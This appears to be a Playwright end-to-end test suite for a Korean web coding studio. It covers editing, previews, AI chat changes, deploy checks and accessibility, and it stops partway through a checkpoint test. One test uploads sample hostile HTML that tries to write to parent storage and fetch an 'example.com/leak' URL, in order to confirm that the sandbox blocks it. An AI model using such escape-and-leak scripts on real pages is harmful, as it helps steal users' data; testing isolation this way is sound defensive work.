import { test, expect } from "@playwright/test";
import AxeBuilder from "@axe-core/playwright";
test("header title edits update the explorer and persist without navigation", async ({
  page,
}) => {
  await page.goto("/");
  await page
    .locator(".project-list > div > button:first-child")
    .first()
    .click();
  const title = page.getByRole("textbox", { name: "프로젝트 이름 편집" });
  const root = page.locator(".tree-root");
  await title.fill("3D 전쟁 게임");
  await expect(root).toHaveText("3D 전쟁 게임");
  await expect(page.getByRole("tree")).toBeVisible();
  await expect(title).toBeFocused();
  await expect(title).toHaveAttribute("maxlength", "100");
  await title.fill("   ");
  await title.press("Tab");
  await expect(title).toHaveValue("3D 전쟁 게임");
  await title.fill("  새 게임 이름  ");
  await expect(root).toHaveText("새 게임 이름");
  await title.press("Enter");
  await expect(title).toHaveValue("새 게임 이름");
  await expect(page.getByText("저장됨", { exact: true })).toBeVisible();
  await page.reload();
  await page
    .locator(".project-list > div > button:first-child")
    .filter({ hasText: "새 게임 이름" })
    .click();
  await expect(title).toHaveValue("새 게임 이름");
  await expect(root).toHaveText("새 게임 이름");
});

test("file row actions appear on hover or keyboard focus and rename uses the pencil", async ({
  page,
}) => {
  await page.goto("/");
  await page
    .locator(".project-list > div > button:first-child")
    .first()
    .click();
  const row = page.getByRole("treeitem", { name: "style.css", exact: true });
  const rename = row.getByRole("button", { name: "style.css 이름 변경" });
  const remove = row.getByRole("button", { name: "style.css 삭제" });
  await page.locator(".topbar").hover();
  await expect(rename).toHaveCSS("opacity", "0");
  await expect(remove).toHaveCSS("opacity", "0");
  await row.hover();
  await expect(rename).toHaveCSS("opacity", "1");
  await expect(remove).toHaveCSS("opacity", "1");
  expect(
    await rename.evaluate((button) =>
      button.nextElementSibling?.getAttribute("aria-label"),
    ),
  ).toBe("style.css 삭제");
  await row
    .getByRole("button", { name: "style.css", exact: true })
    .click({ button: "right" });
  await expect(page.getByRole("dialog")).not.toBeVisible();
  await page.keyboard.press("Escape");
  await rename.click();
  await page.getByLabel("파일 경로", { exact: true }).fill("game.css");
  await page.getByRole("button", { name: "확인", exact: true }).click();
  const renamed = page.getByRole("treeitem", { name: "game.css", exact: true });
  await expect(row).toHaveCount(0);
  await page.locator(".topbar").hover();
  await renamed.getByRole("button", { name: "game.css", exact: true }).focus();
  await expect(
    renamed.getByRole("button", { name: "game.css 이름 변경" }),
  ).toHaveCSS("opacity", "1");
  await renamed.getByRole("button", { name: "game.css 삭제" }).click();
  await expect(page.getByRole("dialog")).toContainText("game.css");
  await page.getByRole("button", { name: "취소", exact: true }).click();
  await expect(renamed).toBeVisible();
});

test("preview device buttons follow available panel width at tablet and desktop boundaries", async ({
  page,
}) => {
  await page.goto("/");
  await page
    .locator(".project-list > div > button:first-child")
    .first()
    .click();
  const mobile = page.getByRole("button", { name: "모바일 폭", exact: true });
  const tablet = page.getByRole("button", { name: "태블릿 폭", exact: true });
  const desktop = page.getByRole("button", {
    name: "데스크톱 폭",
    exact: true,
  });
  const stage = page.locator(".preview-stage");
  await expect(desktop).toBeDisabled();
  await page.getByRole("button", { name: "탐색기 접기", exact: true }).click();
  await page.getByRole("button", { name: "AI 패널 접기", exact: true }).click();
  await expect(desktop).toBeEnabled();
  const outsideWidth = 1440 - (await stage.boundingBox())!.width;
  for (const [width, tabletEnabled, desktopEnabled] of [
    [1024, true, true],
    [1023, true, false],
    [768, true, false],
    [767, false, false],
  ] as const) {
    await page.setViewportSize({ width: outsideWidth + width, height: 900 });
    await expect(tablet).toBeEnabled({ enabled: tabletEnabled });
    await expect(desktop).toBeEnabled({ enabled: desktopEnabled });
    await expect(mobile).toBeEnabled();
  }
  await expect(tablet).toHaveCSS("opacity", "0.5");
  await expect(desktop).toHaveCSS("opacity", "0.5");
  await mobile.click();
  await expect(page.locator('iframe[title="작품 미리보기"]')).toHaveCSS(
    "width",
    "375px",
  );
  await page.setViewportSize({ width: outsideWidth + 1024, height: 900 });
  await expect(tablet).toBeEnabled();
  await expect(desktop).toBeEnabled();
  await tablet.click();
  await expect(page.locator('iframe[title="작품 미리보기"]')).toHaveCSS(
    "width",
    "768px",
  );
  await desktop.click();
  await expect(page.locator('iframe[title="작품 미리보기"]')).toHaveCSS(
    "width",
    "1024px",
  );
});

test("project → edit → automatic AI changes → preview → ZIP verification → reload", async ({
  page,
}) => {
  await page.goto("/");
  await page
    .locator(".project-list > div > button:first-child")
    .filter({ hasText: "나의 첫 클릭 게임" })
    .first()
    .click();
  await expect(
    page.getByRole("treeitem", { name: "index.html", exact: true }),
  ).toBeVisible();
  await page.getByRole("button", { name: "새 파일", exact: true }).click();
  await page.getByLabel("파일 경로", { exact: true }).fill("notes.md");
  await page.getByRole("button", { name: "확인", exact: true }).click();
  await page.getByRole("textbox", { name: /notes.md 코드 편집기/ }).focus();
  await page.keyboard.insertText("# 저장 테스트");
  await expect(
    page.getByRole("heading", { name: "저장 테스트", exact: true }),
  ).toBeVisible();
  await page.keyboard.press("ControlOrMeta+s");
  await expect(page.getByText("저장됨", { exact: true })).toBeVisible();
  await page.getByText("버튼 색을 파랗게 바꿔줘", { exact: true }).click();
  await expect(
    page.locator(".chat-messages").getByRole("status"),
  ).toContainText("(약 0자)");
  await expect(page.getByText("수정됨", { exact: true }).first()).toBeVisible();
  await expect(
    page.getByRole("tab", { name: "미리보기", exact: true }),
  ).toHaveAttribute("aria-selected", "true");
  const preview = page.frameLocator('iframe[title="작품 미리보기"]');
  await expect(
    preview.getByRole("button", { name: "클릭해서 +1", exact: true }),
  ).toHaveCSS("background-color", "rgb(59, 130, 246)");
  await preview
    .getByRole("button", { name: "클릭해서 +1", exact: true })
    .click();
  await expect(preview.locator("#score")).toHaveText("1");
  await page
    .getByRole("button", { name: "라운지에 게시하기", exact: true })
    .click();
  await page
    .getByRole("textbox", { name: "설명", exact: true })
    .fill("비공개 배포 설정 유지");
  await page.getByLabel("주소 이름", { exact: true }).fill("private-test");
  await page.getByLabel("공개", { exact: true }).uncheck();
  await page.getByLabel("목록에 표시", { exact: true }).uncheck();
  await page.getByRole("button", { name: "배포 ZIP 검증" }).click();
  await expect(page.getByRole("dialog")).not.toBeVisible();
  await page.getByRole("button", { name: "라운지에 게시하기" }).click();
  await expect(page.getByText("ZIP 검증 완료", { exact: true })).toBeVisible();
  await page.getByRole("button", { name: "닫기", exact: true }).click();
  await page.reload();
  await page
    .locator(".project-list > div > button:first-child")
    .filter({ hasText: "나의 첫 클릭 게임" })
    .first()
    .click();
  await expect(
    page.getByRole("treeitem", { name: "notes.md", exact: true }),
  ).toBeVisible();
  await page
    .getByRole("button", { name: "라운지에 게시하기", exact: true })
    .click();
  await expect(
    page.getByRole("textbox", { name: "설명", exact: true }),
  ).toHaveValue("비공개 배포 설정 유지");
  await expect(page.getByLabel("주소 이름", { exact: true })).toHaveValue(
    "private-test",
  );
  await expect(page.getByLabel("공개", { exact: true })).not.toBeChecked();
  await expect(
    page.getByLabel("목록에 표시", { exact: true }),
  ).not.toBeChecked();
  await page.getByRole("button", { name: "닫기", exact: true }).click();
  await expect(
    page.getByRole("treeitem", { name: "notes.md", exact: true }),
  ).toBeVisible();
  await expect(page.getByText("수정됨", { exact: true }).first()).toBeVisible();
  await page
    .getByRole("treeitem", { name: "notes.md", exact: true })
    .getByRole("button", { name: "notes.md", exact: true })
    .click();
  await expect(
    page.getByRole("heading", { name: "저장 테스트", exact: true }),
  ).toBeVisible();
  await page
    .getByRole("treeitem", { name: "index.html", exact: true })
    .getByRole("button", { name: "index.html", exact: true })
    .click();
  await page.screenshot({
    path: "test-results/editor-desktop.png",
    fullPage: true,
  });
  await page.getByRole("button", { name: "대화 삭제", exact: true }).click();
  const deleteDialog = page.getByRole("dialog", {
    name: "대화 삭제",
    exact: true,
  });
  await deleteDialog.getByRole("button", { name: "취소", exact: true }).click();
  await expect(page.getByText("수정됨", { exact: true }).first()).toBeVisible();
  await page.getByRole("button", { name: "대화 삭제", exact: true }).click();
  await deleteDialog
    .getByRole("button", { name: "대화 삭제", exact: true })
    .click();
  await expect(page.locator(".message")).toHaveCount(0);
  await expect(page.getByLabel("대화 선택").locator("option")).toHaveText(
    "새 대화",
  );
  await page.reload();
  await page
    .locator(".project-list > div > button:first-child")
    .filter({ hasText: "나의 첫 클릭 게임" })
    .first()
    .click();
  await expect(page.locator(".message")).toHaveCount(0);
  await expect(
    page.getByRole("treeitem", { name: "notes.md", exact: true }),
  ).toBeVisible();
  await expect(
    page
      .frameLocator('iframe[title="작품 미리보기"]')
      .getByRole("button", { name: "클릭해서 +1", exact: true }),
  ).toHaveCSS("background-color", "rgb(59, 130, 246)");
});
test("keyboard, focus, theme and accessibility", async ({ page }) => {
  await page.goto("/");
  await page
    .locator(".project-list > div > button:first-child")
    .filter({ hasText: "나의 첫 클릭 게임" })
    .first()
    .click();
  await expect(
    page.getByRole("treeitem", { name: "index.html", exact: true }),
  ).toBeVisible();
  await page.keyboard.press("ControlOrMeta+p");
  await expect(page.getByRole("dialog")).toBeVisible();
  await page.getByLabel("파일 이름 검색").fill("style");
  await page
    .getByRole("dialog")
    .getByRole("button", { name: "style.css" })
    .click();
  await page.keyboard.press("ControlOrMeta+b");
  await expect(page.getByRole("tree")).not.toBeVisible();
  expect(
    await page.evaluate(async () => {
      const faces = await document.fonts.load(
        '700 16px "Orbitron"',
        "Let's Coding Studio",
      );
      return (
        faces.length > 0 && faces.every((face) => face.status === "loaded")
      );
    }),
  ).toBe(true);

  await page.keyboard.press("ControlOrMeta+b");
  const result = await new AxeBuilder({ page })
    .exclude(".monaco-editor")
    .withTags(["wcag2a", "wcag2aa"])
    .analyze();
  expect(
    result.violations.map((v) => ({
      id: v.id,
      nodes: v.nodes.map((n) => n.target),
    })),
  ).toEqual([]);
  await expect(
    page.getByRole("button", { name: "테마 전환", exact: true }),
  ).not.toBeVisible();
  await page.keyboard.press("ControlOrMeta+Shift+p");
  await page.getByLabel("명령 검색").fill("테마 전환");
  await page
    .getByRole("dialog")
    .getByRole("button", { name: "테마 전환", exact: true })
    .click();
  await expect(page.locator("html")).toHaveAttribute("data-theme", "light");
  const light = await new AxeBuilder({ page })
    .exclude(".monaco-editor")
    .withTags(["wcag2a", "wcag2aa"])
    .analyze();
  expect(
    light.violations.map((v) => ({
      id: v.id,
      nodes: v.nodes.map((n) => n.target),
    })),
  ).toEqual([]);
});
test("duplicate tab warning and hostile HTML cannot access parent storage", async ({
  page,
  context,
}) => {
  await page.goto("/");
  await page
    .locator(".project-list > div > button:first-child")
    .filter({ hasText: "나의 첫 클릭 게임" })
    .first()
    .click();
  await expect(page.getByRole("tree")).toBeVisible();
  const other = await context.newPage();
  await other.goto("/");
  await other
    .locator(".project-list > div > button:first-child")
    .filter({ hasText: "나의 첫 클릭 게임" })
    .first()
    .click();
  await expect(
    page.getByText(
      "다른 탭에서도 이 프로젝트를 열었습니다. 한 탭에서만 편집하세요.",
    ),
  ).toBeVisible();
  await other.close();
  const hostile = Buffer.from(
    '<!doctype html><html><body><h1>격리 확인</h1><script>try { parent.localStorage.setItem("escaped","yes") } catch { console.log("isolated") };fetch("https://example.com/leak").catch(()=>console.log("network blocked"))</script></body></html>',
  );
  page.on("dialog", (dialog) => dialog.accept());
  await page.getByLabel("업로드할 파일").setInputFiles({
    name: "index.html",
    mimeType: "text/html",
    buffer: hostile,
  });
  await page.getByRole("tab", { name: "미리보기" }).click();
  await expect(
    page.frameLocator('iframe[title="작품 미리보기"]').getByText("격리 확인"),
  ).toBeVisible();
  await expect
    .poll(() => page.evaluate(() => localStorage.getItem("escaped")))
    .toBeNull();
  await page.getByRole("button", { name: /콘솔/ }).click();
  await expect(
    page.getByRole("button", { name: /network blocked/ }),
  ).toBeVisible();
});

test("project home → blank creation → workspace → return, clone and delete", async ({
  page,
}) => {
  await page.goto("/");
  await expect(page.locator(".brand")).toBeVisible();
  expect(
    await page.evaluate(async () => {
      const fonts = await document.fonts.load('700 16px "Orbitron"');
      return (
        fonts.length > 0 &&
        getComputedStyle(document.querySelector(".brand")!).fontFamily.includes(
          "Orbitron",
        )
      );
    }),
  ).toBe(true);
  await expect(
    page.getByRole("heading", { name: "나의 프로젝트", exact: true }),
  ).toBeVisible();
  await expect(page.getByRole("dialog")).not.toBeVisible();
  await expect(page.getByRole("tree")).not.toBeVisible();
  await page
    .getByRole("button", { name: "새 프로젝트 만들기", exact: true })
    .click();
  await expect(
    page.getByRole("heading", { name: "새 프로젝트", exact: true }),
  ).toHaveCount(1);
  await expect(
    page.getByLabel("프로젝트 이름", { exact: true }),
  ).toHaveAttribute("placeholder", "프로젝트 이름을 입력하세요.");
  const popup = await page.getByRole("dialog").boundingBox();
  expect(popup).not.toBeNull();
  expect(Math.abs(popup!.x + popup!.width / 2 - 720)).toBeLessThan(2);
  expect(Math.abs(popup!.y + popup!.height / 2 - 450)).toBeLessThan(2);
  await expect(page.getByText("클릭 게임", { exact: true })).not.toBeVisible();
  await page.getByLabel("프로젝트 이름", { exact: true }).fill("검증 프로젝트");
  await page.getByLabel("프로젝트 이름", { exact: true }).press("Enter");
  await expect(page.getByRole("tree")).toBeVisible();
  await expect(page.getByRole("tablist").getByRole("tab")).toHaveCount(1);
  await expect(
    page.getByRole("tab", { name: "미리보기", exact: true }),
  ).toHaveAttribute("aria-selected", "true");
  await expect(
    page.getByRole("region", { name: "AI 채팅", exact: true }),
  ).toBeVisible();
  await expect(
    page.frameLocator('iframe[title="작품 미리보기"]').locator("body"),
  ).not.toContainText("Hello");
  await expect(
    page.getByRole("button", { name: "파일 검색", exact: true }),
  ).toHaveCount(0);
  await expect(page.locator(".capacity")).toContainText("/ 30MB");
  const fileSearch = page.getByRole("searchbox", { name: "탐색기 파일 검색" });
  await fileSearch.fill("SCRIPT");
  await expect(
    page.getByRole("treeitem", { name: "script.js", exact: true }),
  ).toBeVisible();
  await expect(
    page.getByRole("treeitem", { name: "index.html", exact: true }),
  ).toHaveCount(0);
  await fileSearch.fill("");
  await page.getByRole("treeitem", { name: "index.html", exact: true }).click();
  await page.getByRole("tab", { name: "index.html", exact: true }).focus();
  await page.keyboard.press("Delete");
  await expect(
    page.getByRole("tab", { name: "미리보기", exact: true }),
  ).toHaveAttribute("aria-selected", "true");
  await page.getByRole("treeitem", { name: "index.html", exact: true }).click();
  await page.getByTitle("index.html 탭 닫기").click();
  await expect(
    page.getByRole("tab", { name: "미리보기", exact: true }),
  ).toHaveAttribute("aria-selected", "true");
  await expect(
    page.getByText("무엇을 만들어볼까요?", { exact: true }),
  ).not.toBeVisible();
  await expect(
    page.getByText("요청한 내용을 파일과 미리보기에 반영해요.", {
      exact: true,
    }),
  ).not.toBeVisible();
  await page.getByRole("button", { name: "새 대화", exact: true }).click();
  await expect(page.getByLabel("대화 선택").locator("option")).toHaveCount(2);
  await page.getByLabel("업로드할 파일").setInputFiles({
    name: ".env.local",
    mimeType: "text/plain",
    buffer: Buffer.from("test-not-a-secret"),
  });
  await expect(page.getByText(/라운지에서 금지한 파일입니다/)).toBeVisible();
  await page
    .getByRole("link", { name: "Let's Coding Studio 메인페이지" })
    .click();
  await expect(
    page.getByRole("heading", { name: "나의 프로젝트", exact: true }),
  ).toBeVisible();
  await expect(page.locator(".account-storage")).toContainText("/ 100MB");
  const card = page
    .locator(".project-list > div")
    .filter({ has: page.getByText("검증 프로젝트", { exact: true }) });
  await expect(card.locator("small")).toHaveCount(1);
  await expect(card.locator("small")).not.toContainText("최종 수정");
  await expect(card.locator("button:first-child svg")).toHaveCount(0);
  await expect(
    card.getByRole("button", { name: "검증 프로젝트 이름 변경", exact: true }),
  ).toHaveAttribute("title", "프로젝트 이름 바꾸기");
  await expect(
    card.getByRole("button", { name: "검증 프로젝트 복제", exact: true }),
  ).toHaveAttribute("title", "프로젝트 복사본 만들기");
  await expect(
    card.getByRole("button", {
      name: "검증 프로젝트 프로젝트 삭제",
      exact: true,
    }),
  ).toHaveAttribute("title", "프로젝트 삭제하기");
  await page
    .getByRole("button", { name: "검증 프로젝트 복제", exact: true })
    .click();
  const duplicateDialog = page.getByRole("dialog", {
    name: "프로젝트 복제",
    exact: true,
  });
  await expect(
    duplicateDialog.getByText('"검증 프로젝트" 프로젝트를 복제하시겠습니까?'),
  ).toBeVisible();
  await expect(
    page
      .locator(".project-list")
      .getByText("검증 프로젝트 복사본", { exact: true }),
  ).toHaveCount(0);
  await duplicateDialog
    .getByRole("button", { name: "취소", exact: true })
    .click();
  await page
    .getByRole("button", { name: "검증 프로젝트 복제", exact: true })
    .click();
  await duplicateDialog
    .getByRole("button", { name: "복제", exact: true })
    .click();
  await expect(
    page.getByRole("heading", { name: "나의 프로젝트", exact: true }),
  ).toBeVisible();
  await expect(page.getByRole("tree")).not.toBeVisible();
  await expect(
    page
      .locator(".project-list")
      .getByText("검증 프로젝트 복사본", { exact: true }),
  ).toBeVisible();
  await page
    .getByRole("button", {
      name: "검증 프로젝트 복사본 프로젝트 삭제",
      exact: true,
    })
    .click();
  const projectDeleteDialog = page.getByRole("dialog", {
    name: "프로젝트 삭제",
    exact: true,
  });
  await expect(
    projectDeleteDialog.getByText(
      '"검증 프로젝트 복사본" 프로젝트를 삭제할까요?',
    ),
  ).toBeVisible();
  const deleteButton = projectDeleteDialog.getByRole("button", {
    name: "삭제",
    exact: true,
  });
  await expect(deleteButton).toBeDisabled();
  await projectDeleteDialog
    .getByLabel("삭제할 프로젝트 이름")
    .fill("검증 프로젝트 복사본 ");
  await expect(deleteButton).toBeDisabled();
  await projectDeleteDialog
    .getByRole("button", { name: "취소", exact: true })
    .click();
  await expect(
    page
      .locator(".project-list")
      .getByText("검증 프로젝트 복사본", { exact: true }),
  ).toBeVisible();
  await page
    .getByRole("button", {
      name: "검증 프로젝트 복사본 프로젝트 삭제",
      exact: true,
    })
    .click();
  await projectDeleteDialog
    .getByLabel("삭제할 프로젝트 이름")
    .fill("검증 프로젝트 복사본");
  await expect(deleteButton).toBeEnabled();
  await expect(
    projectDeleteDialog.locator('label[for="project-delete-name"]'),
  ).toHaveClass("sr-only");
  const inputBounds = await projectDeleteDialog
    .getByLabel("삭제할 프로젝트 이름")
    .boundingBox();
  await page.mouse.move(inputBounds!.x + 20, inputBounds!.y + 20);
  await page.mouse.down();
  await page.mouse.move(5, 5);
  await page.mouse.up();
  await expect(projectDeleteDialog).toBeVisible();
  await page.mouse.move(5, 5);
  await page.mouse.down();
  await page.mouse.up();
  await expect(projectDeleteDialog).not.toBeVisible();
  await page
    .getByRole("button", {
      name: "검증 프로젝트 복사본 프로젝트 삭제",
      exact: true,
    })
    .click();
  await projectDeleteDialog
    .getByLabel("삭제할 프로젝트 이름")
    .fill("검증 프로젝트 복사본");
  await deleteButton.hover();
  await expect(deleteButton).toHaveCSS("background-color", "rgb(198, 47, 62)");
  await expect(deleteButton).toHaveCSS("color", "rgb(255, 255, 255)");
  await deleteButton.click();
  await expect(projectDeleteDialog).not.toBeVisible();
  await expect(
    page
      .locator(".project-list")
      .getByText("검증 프로젝트 복사본", { exact: true }),
  ).not.toBeVisible();
  await page
    .locator(".project-list")
    .getByRole("button", { name: /^검증 프로젝트 \d/ })
    .click();
  await expect(page.getByLabel("대화 선택").locator("option")).toHaveCount(2);
  await page.reload();
  await expect(
    page.getByRole("heading", { name: "나의 프로젝트", exact: true }),
  ).toBeVisible();
  await expect(page.locator(".statusbar")).not.toBeVisible();
  await expect(
    page.locator("header").getByRole("button", { name: "라운지에 게시하기" }),
  ).not.toBeVisible();
  expect(
    await page.evaluate(
      () => document.documentElement.scrollHeight <= window.innerHeight,
    ),
  ).toBe(true);
  await page.setViewportSize({ width: 390, height: 600 });
  expect(
    await page.evaluate(
      () =>
        document.documentElement.scrollHeight <= window.innerHeight &&
        document.documentElement.scrollWidth <= window.innerWidth,
    ),
  ).toBe(true);
  await page.setViewportSize({ width: 1440, height: 900 });
  await page
    .getByRole("button", { name: "검증 프로젝트 이름 변경", exact: true })
    .click();
  await expect(
    page.getByRole("heading", { name: "프로젝트 이름 바꾸기", exact: true }),
  ).toBeVisible();
  const titleInput = page.getByLabel("프로젝트 이름", { exact: true });
  await expect(titleInput).toHaveValue("검증 프로젝트");
  await expect(titleInput).toHaveAttribute(
    "placeholder",
    "새 프로젝트 이름을 입력하세요.",
  );
  await titleInput.fill("바뀐 프로젝트");
  await page
    .getByRole("button", { name: "프로젝트 이름 바꾸기", exact: true })
    .click();
  await expect(page.getByRole("dialog")).not.toBeVisible();
  await page.reload();
  await expect(
    page.locator(".project-list").getByText("바뀐 프로젝트", { exact: true }),
  ).toBeVisible();
  await page.screenshot({
    path: "test-results/projects-home.png",
    fullPage: true,
  });
});
test("stopped AI reply is restored without applying a pending change", async ({
  page,
}) => {
  await page.goto("/");
  await page
    .locator(".project-list > div > button:first-child")
    .filter({ hasText: "나의 첫 클릭 게임" })
    .first()
    .click();
  await expect(page.getByRole("tree")).toBeVisible();
  await page.getByText("버튼 색을 파랗게 바꿔줘", { exact: true }).click();
  await page.getByRole("button", { name: "AI 응답 중단" }).click();
  await expect(page.getByText("중단된 응답", { exact: true })).toBeVisible();
  await page.reload();
  await page
    .locator(".project-list > div > button:first-child")
    .filter({ hasText: "나의 첫 클릭 게임" })
    .first()
    .click();
  await expect(page.getByText("중단된 응답", { exact: true })).toBeVisible();
  await expect(
    page.getByRole("button", { name: "적용", exact: true }),
  ).not.toBeVisible();
});

test("preview console navigation and a separate window retain relative assets and isolation", async ({
  page,
}) => {
  await page.goto("/");
  await page
    .locator(".project-list > div > button:first-child")
    .filter({ hasText: "나의 첫 클릭 게임" })
    .first()
    .click();
  await expect(page.getByRole("tree")).toBeVisible();
  page.once("dialog", (dialog) => dialog.accept());
  await page.getByLabel("업로드할 파일").setInputFiles([
    {
      name: "index.html",
      mimeType: "text/html",
      buffer: Buffer.from(
        '<!doctype html><html lang="ko"><head><title>미리보기 인수</title><link rel="stylesheet" href="view.css"></head><body><a href="/">루트 로고</a><a href="index.html">파일 로고</a><a href="#message">메시지로</a><h1 id="message">준비</h1><img src="pixel.svg" alt="시험 이미지"><script src="console.js"></script></body></html>',
      ),
    },
    {
      name: "view.css",
      mimeType: "text/css",
      buffer: Buffer.from("h1 { color: rgb(1, 2, 3); }"),
    },
    {
      name: "message.txt",
      mimeType: "text/plain",
      buffer: Buffer.from("상대 자산 성공"),
    },
    {
      name: "pixel.svg",
      mimeType: "image/svg+xml",
      buffer: Buffer.from(
        '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10" fill="blue"/></svg>',
      ),
    },
    {
      name: "console.js",
      mimeType: "text/javascript",
      buffer: Buffer.from(
        'fetch("./message.txt").then(r=>r.text()).then(t=>document.querySelector("#message").textContent=t);\nsetTimeout(()=>{\nthrow new Error("줄 이동 검증");\n},50);',
      ),
    },
  ]);
  await page.getByRole("tab", { name: "미리보기", exact: true }).click();
  const frame = page.frameLocator('iframe[title="작품 미리보기"]');
  await expect(
    frame.getByRole("heading", { name: "상대 자산 성공" }),
  ).toHaveCSS("color", "rgb(1, 2, 3)");
  await expect(frame.getByRole("img", { name: "시험 이미지" })).toBeVisible();
  for (const name of ["루트 로고", "파일 로고", "메시지로"]) {
    await frame.getByRole("link", { name, exact: true }).click();
    await expect(
      frame.getByRole("heading", { name: "상대 자산 성공" }),
    ).toBeVisible();
  }

  await page.getByRole("button", { name: /콘솔/ }).click();
  await page
    .getByRole("button", { name: /줄 이동 검증.*console.js:3/ })
    .click();
  await expect(
    page.getByRole("tab", { name: "console.js", exact: true }),
  ).toHaveAttribute("aria-selected", "true");
  await expect(page.locator("footer")).toContainText("줄 3");
  await page.keyboard.press("ArrowUp");
  await expect(page.locator("footer")).toContainText("줄 2");
  await page.getByRole("tab", { name: "미리보기", exact: true }).click();
  await page.getByRole("button", { name: /콘솔/ }).click();
  await page
    .getByRole("button", { name: /줄 이동 검증.*console.js:3/ })
    .click();
  await expect(page.locator("footer")).toContainText("줄 3");
  await page.getByRole("tab", { name: "미리보기", exact: true }).click();
  const popupPromise = page.waitForEvent("popup");
  await page
    .getByRole("button", { name: "미리보기 새 창", exact: true })
    .click();
  const popup = await popupPromise;
  await expect(popup).toHaveTitle("작품 미리보기");
  await expect(
    popup
      .frameLocator('iframe[title="작품 미리보기"]')
      .getByRole("heading", { name: "상대 자산 성공" }),
  ).toBeVisible();
  await expect(
    popup
      .frameLocator('iframe[title="작품 미리보기"]')
      .getByRole("img", { name: "시험 이미지" }),
  ).toBeVisible();
  expect(await popup.evaluate(() => window.opener)).toBeNull();
  await expect(popup.locator("iframe")).toHaveAttribute(
    "sandbox",
    "allow-scripts",
  );
  await popup.close();
  await page
    .getByRole("button", { name: "라운지에 게시하기", exact: true })
    .click();
  const accessibility = await new AxeBuilder({ page })
    .include("dialog")
    .withTags(["wcag2a", "wcag2aa"])
    .analyze();
  expect(
    accessibility.violations.map((v) => ({
      id: v.id,
      nodes: v.nodes.map((n) => n.target),
    })),
  ).toEqual([]);
  await page.keyboard.press("Escape");
  await expect(page.getByRole("dialog")).not.toBeVisible();
  await expect(
    page.getByRole("button", { name: "라운지에 게시하기", exact: true }),
  ).toBeFocused();
});

test("lounge prompt picker fills the draft without sending and dismisses accessibly", async ({
  page,
}) => {
  await page.goto("/");
  await page
    .locator(".project-list > div > button:first-child")
    .first()
    .click();
  const picker = page.getByRole("button", {
    name: "프롬프트 목록",
    exact: true,
  });
  const popup = page.getByRole("group", { name: "라운지 프롬프트" });
  const input = page.getByRole("textbox", { name: "AI에게 보낼 메시지" });
  const messages = await page.locator(".chat-messages article").count();
  const clip = page.getByRole("button", { name: "이미지 첨부", exact: true });
  expect((await picker.boundingBox())!.x).toBeLessThan(
    (await clip.boundingBox())!.x,
  );
  await picker.click();
  await expect(popup.getByRole("button")).toHaveCount(4);
  await page.screenshot({ path: "test-results/lounge-prompt-menu.png" });
  const box = (await popup.boundingBox())!;
  expect(box.x + box.width).toBeLessThanOrEqual(page.viewportSize()!.width);
  await popup
    .getByRole("button", {
      name: "렛츠코딩 라운지 랭킹 시스템 구현해줘.",
      exact: true,
    })
    .click();
  await expect(input).toHaveValue("렛츠코딩 라운지 랭킹 시스템 구현해줘.");
  await expect(input).toBeFocused();
  await expect(popup).toBeHidden();
  await expect(page.locator(".chat-messages article")).toHaveCount(messages);
  await input.fill("기존 요청");
  await picker.click();
  await popup
    .getByRole("button", {
      name: "렛츠코딩 라운지 배포 전용 압축 파일 만들어줘.",
      exact: true,
    })
    .click();
  await expect(input).toHaveValue(
    "기존 요청\n렛츠코딩 라운지 배포 전용 압축 파일 만들어줘.",
  );
  await picker.focus();
  await picker.press("Enter");
  await picker.press("Tab");
  await expect(popup.getByRole("button").first()).toBeFocused();
  await page.keyboard.press("Escape");
  await expect(popup).toBeHidden();
  await expect(picker).toBeFocused();
  await picker.click();
  await page.getByRole("textbox", { name: "프로젝트 이름 편집" }).click();
  await expect(popup).toBeHidden();
  await expect(
    page.locator("header").getByRole("button", { name: "GitHub", exact: true }),
  ).toHaveCount(0);
  await expect(
    page.getByRole("button", { name: "저장 메뉴", exact: true }),
  ).toHaveCount(0);
  const github = page
    .getByRole("complementary", { name: "작업 공간 도구" })
    .getByRole("button", { name: "GitHub", exact: true });
  await expect(github).toBeVisible();
  const chat = page.getByRole("button", { name: "AI 채팅 접기/펼치기" });
  expect((await github.boundingBox())!.y).toBeGreaterThan(
    (await chat.boundingBox())!.y,
  );
  await github.click();
  await expect(page.getByRole("dialog", { name: "GitHub 연동" })).toBeVisible();
  await page.keyboard.press("Escape");
  await expect(github).toBeFocused();
  const account = page.locator(".account-button");
  await account.hover();
  await expect(account).toHaveCSS("background-color", "rgba(0, 0, 0, 0)");
  await expect(account).toHaveCSS("border-top-width", "0px");
  await expect(account).toHaveCSS("color", "rgb(165, 243, 207)");
  await expect(
    page.locator("header").getByRole("button", { name: "라운지에 게시하기" }),
  ).toBeVisible();
});

test("checkpoints keep earlier versions with an optional reflection, including demo deploys", async ({
  page,
}) => {
  await page.goto("/");
  await page
    .locator(".project-list > div > button:first-child")
    .filter({ hasText: "나의 첫 클릭 게임" })
    .first()
    .click();
  await expect(page.getByRole("tree")).toBeVisible();
  const upload = async (heading: string) => {
    page.once("dialog", (dialog) => dialog.accept());
    await page.getByLabel("업로드할 파일").setInputFiles({
      name: "index.html",
      mimeType: "text/html",
      buffer: Buffer.from(
        `<!doctype html><html lang="ko"><head><title>체크포인트</title></head><body><h1>${heading}</h1></body></html>`,
      ),
    });
    await expect(page.getByText("저장됨", { exact: true })).toBeVisible();
  };
  await upload("첫 버전");
  await page.getByRole("button", { name: "여기까지 완성" }).click();
  const dialog = page.getByRole("dialog", { name: "여기까지 완성" });
  await expect(
    dialog.getByText("아직 남긴 체크포인트가 없어요."),
  ).toBeVisible();
  const note = dialog.getByLabel("한 줄 회고 (선택)");
  await expect(note).toHaveAttribute("maxlength", "200");
  await note.fill("제목을 처음 만들었다");
  await dialog.getByRole("button", { name: "체크포인트 남기기" }).click();
  await expect(dialog.getByText("제목을 처음 만들었다")).toBeVisible();
  // The same saved state is not stored twice.
  await dialog.getByRole("button", { name: "체크포인트 남기기" }).click();
  await expect(dialog.locator(".checkpoint-list li")).toHaveCount(1);
  await dialog.getByRole("button", { name: "닫기" }).first().click();

  await upload("두 번째 버전");
  await page.getByRole("button", { name: "라운지에 게시하기" }).click();
  const deploy = page.getByRole("dialog", { name: "작품 배포" });
  await deploy.getByLabel("한 줄 회고 (선택)").fill("두 번째 버전을 게시했다");
  await deploy.getByRole("button", { name: "배포 ZIP 검증" }).click();
  await expect(deploy).not.toBeVisible();

  await page.getByRole("button", { name: "여기까지 완성" }).click();
  const items = dialog.locator(".checkpoint-list li");
  await expect(items).toHaveCount(2);
  await expect(items.first()).toContainText("게시");
